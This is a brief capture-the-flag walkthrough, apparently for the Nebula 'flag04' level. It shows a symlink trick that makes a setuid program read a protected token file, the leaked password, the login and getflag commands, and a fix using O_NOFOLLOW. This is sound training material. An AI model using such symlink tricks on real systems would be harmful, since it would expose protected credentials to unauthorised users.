```bash
ln -s /home/flag04/token /tmp/tok # Full-paths needed to create the symbolic links properly.
./flag04 /tmp/tok
```

This prints the password `06508b5e-8909-4f38-b630-fdb148a848a2`. Log into the `flag04` account with it and do:

```bash
getflag
```

A way to fix the target `flag04` program would be to include the `O_NOFOLLOW` option for `open` which disallows following of symlinks.
